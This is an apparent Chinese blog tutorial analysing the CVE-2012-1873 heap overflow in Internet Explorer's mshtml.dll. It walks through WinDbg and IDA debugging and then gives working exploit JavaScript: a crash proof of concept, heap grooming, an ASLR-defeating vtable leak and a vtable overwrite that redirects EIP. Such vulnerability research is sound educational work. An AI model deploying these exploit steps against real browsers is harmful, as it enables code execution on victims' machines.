# 一、漏洞简述

cve-2012-1873同样是一个著名的堆溢出漏洞，他是IE6-8中MSHTL.dll中的CTableLayout::CalculateMinMax函数里，程序在执行时会以HTML代码中的元素span属性作为循环控制次数向堆中写入数据。第一次会优先根据span申请堆空间，当我们增大span的值后，却不会改变堆空间大小，这样就可以造成堆溢出。

# 二、漏洞环境

系统版本  
  
---  
  
​Win7x86sp1  
  
# 三、漏洞分析

首先对IE打开页堆：

![](https://image.3001.net/images/20230510/1683719361_645b84c10a1d21d4aa0f6.png!small)

然后我们用下面这段POC代码：

<html>  
<body>  
<table style="table-layout:fixed" >  
<col id="132" width="41" span="1" >&ampnbsp col>  
table>  
<script>  
  
function over_trigger() {  
var obj_col = document.getElementById("132");  
obj_col.width = "42765";  
obj_col.span = 1000;  
}  
  
setTimeout("over_trigger();",1);  
  
script>  
body>  
html>

这里先对span属性赋值为1，然后又通过函数trigger修改为1000，保存后把后缀名改成html。用IE打开，卡在这里，接下来用WIndbg附加：

![](https://image.3001.net/images/20230510/1683719363_645b84c3456a2fa7ad045.png!small)

![](https://image.3001.net/images/20230510/1683719364_645b84c47e4ede42a4b39.png!small)

  
g起来，让他走

![](https://image.3001.net/images/20230510/1683719366_645b84c6776e072ed78a7.png!small)

然后回到IE中，选择允许运行

![](https://image.3001.net/images/20230510/1683719367_645b84c7dd97b4ec557d6.png!small)

然后因为页堆保护，断在了溢出位置，mshtml!CTableColCalc::AdjustForCol+0x15:

![](https://image.3001.net/images/20230510/1683719368_645b84c8e737a71e7aed3.png!small)

这里可以看到esi的地址导致溢出，我们查看堆栈，可以看到在mshtml!CTableLayout::CalculateMinMax+0x558的地址调用了之前那个函数：

![](https://image.3001.net/images/20230510/1683719370_645b84ca3e58b1d6736c5.png!small)

所以我们需要在mshtml!CTableLayout::CalculateMinMax函数下断点，看看溢出原因是什么，所以重新运行IE，用windbg附加IE，重复之前的操作，在附加之后对函数mshtml!CTableLayout::CalculateMinMax下断点，然后单步调试查找溢出原因：

![](https://image.3001.net/images/20230510/1683719371_645b84cb3fc7a922b5621.png!small)

随后go起来，然后允许操作，可以看到，已经断在了我们断点函数这里：

![](https://image.3001.net/images/20230510/1683719372_645b84cc3baa60fc2cd0e.png!small)

在这里我们看一下CTableLayout::CalculateMinMax的函数声明：

void __thiscall CTableLayout::CalculateMinMax(CTableLayout*theTableLayoutobj，
LPVOID IpUnknownstackBuffer);

在这里说明一下，CTableLayout * theTableLayoutobj 这个变量是一个指针，他其实是指向table
元素在内存中的对象，在后续跟踪中就会发现，这里可以先入为主利于理解。  
接下来我们单步走：

![](https://image.3001.net/images/20230510/1683719373_645b84cd526ea9a72f3a5.png!small)

在这里看箭头位置，可以看到ebp+8是第一个参数，赋予eax，也就是 theTableLayoutobj
。通过符号，也可以看出确实是引用CTableLayout对象，也就是标签在内存中的对象。再看：

![](https://image.3001.net/images/20230510/1683719374_645b84ce566a42678d89a.png!small)

这里ebx+54h的位置是span属性的值，为1。  
接下来我们需要注意CalculateMinMax+170h位置这条指令：

![](https://image.3001.net/images/20230510/1683719375_645b84cf66947d8a1ed69.png!small)

这里取地址ebx+90h给了esi，而此时ebx的值大家可以注意，就是我们table
元素在内存中的对象的地址。接下来就是调用mshtml!CImplAry::EnsureSizeWorker这个函数：

![](https://image.3001.net/images/20230510/1683719376_645b84d05a439e9988f9c.png!small)

F8进入这个函数，我们看这里，可以看到这里又把ebx+90h的地址给了edi：

![](https://image.3001.net/images/20230510/1683719377_645b84d13adb8823a5830.png!small)

继续F8走，看箭头位置，又把edi+0Ch给了esi，所以这里堆的地址是ebx+9c：

![](https://image.3001.net/images/20230510/1683719378_645b84d260eae7a02fe00.png!small)

确定了堆的地址，我们继续确定堆的大小，直接看IDA中伪代码：

![](https://image.3001.net/images/20230510/1683719379_645b84d3852b0dbd99992.png!small)

我们跟进去EnsureSizeWorker：

![](https://image.3001.net/images/20230510/1683719380_645b84d43cfd613f5c8cc.png!small)

可以看到这里做了判断，最低是4* 0x1C个空间，span的值是1，所以这里应该是0x70大小的堆栈空间。我们回到Windbg中查看一下：

![](https://image.3001.net/images/20230510/1683719381_645b84d575fcdea1bafc7.png!small)

可以看到堆大小确实为0x70。堆地址为：05f08f90。  
接下来我们对函数mshtml!CTableCol::GetAAspan和函数
mshtml!CImplAry::EnsureSizeWorker下断点，go起来，断在了GetAAspan上：

![](https://image.3001.net/images/20230510/1683719382_645b84d6c73edf390ce4a.png!small)

这里禁用1号断点，因为会一直进去，手动跟一次就会发现第二次跳过了申请堆空间这个操作，误以为之前申请的已经足够。再次走到GetAAspan函数，这次是为了获取循环写入堆次数的一次调用，我们先不讨论。再次运行到GetAAspan，gu执行完这个函数，可以看到eax的值是3e8，也就是1000，下面有个cmp比较，这里说明span最大不能超过1000：

![](https://image.3001.net/images/20230510/1683719384_645b84d87f84e51642bb7.png!small)

接下来对堆地址下断点，然后go起来：

![](https://image.3001.net/images/20230510/1683719385_645b84d9b1103f358668b.png!small)

发现地址写入的值是414114，在计算器中看一下：

![](https://image.3001.net/images/20230510/1683719386_645b84dac78b0aa28da7c.png!small)

他的值就是我们修改过width* 100的大小。（可以自行试验，这里取巧）继续单步跟进，发现Inc和cmp：

![](https://image.3001.net/images/20230510/1683719388_645b84dc40b2069ebbc4b.png!small)

可以发现这里拷贝次数就是span的值，然后通过inc和cmp比较，拷贝，ebp-14是每次加一，和span的值ebp+10h比较，随后ebp-24h的地方会加1C。随后我们继续走，就可以发现异常原因了，只有4个1C，但是我们修改span后，循环1000次写入1C个大小，导致异常。  
总而言之，就是修改完span后，没有再次申请堆内存，导致在写入样式信息的时候循环写入1000次，在第五次的时候就会发生溢出，因为第一次申请内存是4个1C大小。

# 四、漏洞利用（有失败风险，很低，如果堆栈布局没有符合心意，可以重新打开一下）

首先通过x32dbg插件checksec查看漏洞保护，所以介次需要绕过DEP保护和ASLR：

![](https://image.3001.net/images/20230510/1683719389_645b84ddcb0b7c6826702.png!small)

首先我们需要获取mshtml.dll基址，来绕过ASLR保护。至于怎么获取，我们这里通过获取CButtonLayout虚表指针和msgtml.dll的固定偏移来获取，首先看下面这段代码，是构造堆布局，让程序在为申请堆空间的时候，落入我们布置的区域内，当然记得关闭页堆：

<html>  
<body>  
<div id="test">div>  
<table style="table-layout:fixed"><col id="132" width="41" span="9">
col>table>  
<meta http-equiv="content-type" content="text/html; charset=UTF-8">  
<script language='javascript'>  
var leak_index=-1;  
var dap= "EEEE";  
while ( dap.length < 480 ) dap += dap;  
var padding= "AAAA";  
while ( padding.length < 480) padding += padding;  
var filler = "BBBB";  
while ( filler.length < 480) filler += filler;  
var arr=new Array();  
var rra=new Array();  
var div_container=document.getElementById("test");  
div_container.style.cssText="display:none";  
for(var i=0;i<500;i+=2){  
rra[i]=dap.substring(0,(0x100-6)/2);  
arr[i]=padding.substring(0,(0x100-6)/2);  
arr[i+1]=filler.substring(0,(0x100-6)/2);  
var obj=document.createElement("button");  
div_container.appendChild(obj);  
}  
for(var i=200;i<500;i+=2){  
rra[i]=null;  
CollectGarbage();  
}  
script>  
body>  
html>

## ​4.1、构造堆布局，查看各大块大小

首先这里的字符串在IE中都是Basic
String字符串，包含长度前缀4字节和2字节的NULL终止符的Unicode字符串，随后这里是构造俩个数组，申请以0x100（0x100-6是纯字符串，除以二是Unicode编码，最后会自动加上6字节的长度前缀和NULL终止符）为大小的堆块，分别为EEE…，AAA…，BBB…，CButtonLayout（大小为0x108，后续我们会在堆栈中查看）；然后循环250次，构造的堆空间如下

![](https://image.3001.net/images/20230510/1683719391_645b84dfe6ebaa1c04188.png!small)

然后会在代码最后一个for循环中，从堆块链中间开始，释放EEEEE…所在的堆块。至于Span为啥是9，因为我们在分析的时候会知道，分配的堆大小是span值*
0x1C,这里9* 0x1c=FC，是CButtonLayout的大小（待会会在Windbg中查看）。  
接下来就是使用前面这段代码，改后缀为html，双击打开，使用windbg附加，先对mshtml!CTableLayout::CalculateMinMax下断点，然后go起来，直到断点断在mshtml!CTableLayout::CalculateMinMax函数上面：

![](https://image.3001.net/images/20230510/1683719392_645b84e093846d175b471.png!small)

然后对申请空间 mshtml!CImplAry::EnsureSizeWorker函数下断点，go起来，卡到这个断点，再gu执行到返回：

![](https://image.3001.net/images/20230510/1683719393_645b84e191af52d98bcc9.png!small)

之前我们分析的时候就知道这里ebx+0x9c是分配的堆栈地址，我们查看一下：

![](https://image.3001.net/images/20230510/1683719394_645b84e2c04afb81af3de.png!small)

可以看到，申请的堆块里面的内容就是EEE…，也就是我们的堆布局完成了，接下来看看CButtonLayout大小：

![](https://image.3001.net/images/20230510/1683719396_645b84e41aafed8707aee.png!small)

可以看到CButtonLayout的Size=0x21*
8=0x108字节。UserSize=0xFC，但因为内存对齐关系，实际大小为0x108字节。接下来查找大小100h的块，使用!heap -flt s
100,再随便找个地址使用!heap -p -a
0x056bea68查看:![](https://image.3001.net/images/20230510/1683719397_645b84e594d50ad0dfb41.png!small)

​可以看到堆块是21h* 8 =108h，用户大小是100h。

随后我们看一下CButtonLayout虚函数地址（x mshtml!CButtonLayout: ），可以看到虚函数地址在BBBB…堆块之后：

![](https://image.3001.net/images/20230510/1683719399_645b84e789baf0cce6ee3.png!small)

## 4.2、第一次溢出

这次我们需要加上修改span的代码，如下：

var leak_col = document.getElementById("132");  
leak_col.width = "41";  
leak_col.span = "19";

简单计算一下，19* 1ch=214h。214h-108h*
2=4字节（108h是100堆大小+8h字节头信息），所以这里会覆盖BBB堆块前四个字节；接下来使用新的POC验证一下，还是先下mshtml!CTableLayout::CalculateMinMax断点，断在这里在下mshtml!CTableLayout::CalculateMinMax，随后gu走出申请空间函数，这里ebx+9Ch就是申请的堆块地址：

![](https://image.3001.net/images/20230510/1683719400_645b84e8c7cb72a4f352d.png!small)

我们从堆块后面BBB堆块那里截图看一下：

![](https://image.3001.net/images/20230510/1683719402_645b84ea0e94498864e27.png!small)

接下来取消所有断点，直接走，让他溢出:

![](https://image.3001.net/images/20230510/1683719403_645b84eb38389d39683d4.png!small)

可以看到成功溢出到，覆盖到BBB堆块前四个字节。修改完BBB块的长度，在读取这个串的时候就可以访问到后面的虚函数地址。

## 4.3、获取虚函数地址得到MSHTML.DLL基址

再次找到虚函数地址0x64fc84f8：

![](https://image.3001.net/images/20230510/1683719404_645b84ec6de1a9699eceb.png!small)

接下来找mshtml基址（lmm mshtml）0x64e70000：

![](https://image.3001.net/images/20230510/1683719405_645b84edaf34d7368e33d.png!small)

俩者相差0x64fc84f8-0x64e70000=0x1584F8（系统版本不同偏移不同）。  
接下来就是获取mshtml基址：

function over_trigger(){  
  
var leak_addr=-1;  
for(var i=0;i<500;i++){  
if(arr[i].length>(0x100-6)/2){  
leak_index=i;  
var leak=arr[i].substring((0x100-6)/2+(2+8)/2,(0x100-6)/2+(2+8+4)/2);  
leak_addr=parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16),16);  
alert("CButtonLayout:0x"+leak_addr.toString(16));  
var mshtmlbase=leak_addr-0x1584F8;  
alert("mshtml：0x"+mshtmlbase.toString(16));  
break;  
}  
}  
}  
setTimeout(function(){over_trigger()}, 450);

这里因为修改了BBB堆的字符长度，所以这里判断这个串是不是很长，确定是我们溢出的BBB串，按照字节读取到虚函数地址，便于查看我们打印出来验证，根据相同步骤获取到虚函数地址那里：

![](https://image.3001.net/images/20230510/1683719406_645b84eed7deace469cb2.png!small)

然后看看mshtml基址：

![](https://image.3001.net/images/20230510/1683719409_645b84f1216a61d37dd4d.png!small)

随后取消所有断点，go起来：

![](https://image.3001.net/images/20230510/1683719411_645b84f3e542acb7494b7.png!small)

![](https://image.3001.net/images/20230510/1683719417_645b84f938c5aea5d97ce.png!small)

  
获取成功。

## 4.4、第二次溢出覆盖虚函数地址

是这段代码：

function trigger_overflow() {  
var evil_col = document.getElementById("132");  
evil_col.width = "1178993";  
evil_col.span = "44";  
}  
setTimeout(function(){trigger_overflow()}, 1000);

为了严谨，我们还是测试一下，前面步骤一样，直接看效果图：

![](https://image.3001.net/images/20230510/1683719420_645b84fc78a060eab3f8e.png!small)

![](https://image.3001.net/images/20230510/1683719421_645b84fd6dd7156d24d48.png!small)

可以看到虚函数地址被覆盖为0x07070024（1178993* 100 = 0x07070024），  
我们对“ba r4 07070048“下断点 继续go的话：

![](https://image.3001.net/images/20230510/1683719422_645b84fe57f8102592cb6.png!small)

可以看到eax=我们构造的地址，而当前函数流程EIP=07070024+24h的地方：

![](https://image.3001.net/images/20230510/1683719423_645b84ff3a8676aca58fb.png!small)

